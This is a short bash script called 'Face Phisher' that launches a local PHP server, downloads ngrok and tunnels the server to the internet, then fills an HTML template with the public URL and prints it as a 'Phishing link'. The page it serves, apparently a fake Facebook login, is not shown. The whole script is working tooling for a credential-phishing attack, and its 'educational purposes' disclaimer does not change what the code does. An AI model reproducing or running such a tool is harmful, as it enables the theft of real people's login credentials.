banner(){
printf "\e[1;77m [+]Face Phisher[+]\e[0m\n"
printf "\e[1;77m [+]BY Jean-Johnson[+]\e[0m\n\n"
printf "Warning: Use it only for educational purposes\n"
}
dependencies(){
	command -v php > /dev/null 2>&1 || { echo >&2 "Php required"; exit 1;}
}
start_services(){
	printf "\e[1;92m[\e[0m+\e[1;92m]Starting php server...\n"
	php -S 127.0.0.1:1771 > /dev/null 2>&1 &
	sleep 2
	printf "\e[1;92m[\e[0m+\e[1;92m]Starting ngrok server...\n"
	./ngrok http 1771 > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"| cut -f3 -d'/' )
	cat template.html > index.html
	sed -i -e "s/THISISHELL/${link}/g" index.html
	printf "\e[1;92m[\e[0m*\e[1;92m] Phishing link:\e[0m\e[1;77m %s\e[0m https://" $link
	read -p $"Press any key to exit .... "
	killall -2 ngrok
	killall -2 php
	echo "Exitting Hack the world ... "
}
start(){
	if [[ -e ngrok ]]; then
	echo ""
	else
	command -v unzip > /dev/null 2>&1 || { echo >&2 "Install unzip: apt-get install unzip"; exit 1;}
	command -v wget > /dev/null 2>&1 || { echo >&2 "wget required"; exit 1;}
	echo "[+]Everything is fine \n"
	fi
	if [[ -e ngrok-stable-linux-386.zip ]] || [[ -e ngrok ]]; then
		echo "Ngrok Already present"
	else
		echo "Download started"
		wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
		echo "Download finished"
	fi
	if [[ -e ngrok-stable-linux-386.zip ]]; then
		unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
		chmod +x ngrok
		rm -rf ngrok-stable-linux-386.zip
	elif [[ -e ngrok ]]; then
		chmod +x ngrok
	else
		echo "Download error"
	fi
	start_services
}
banner
dependencies
start
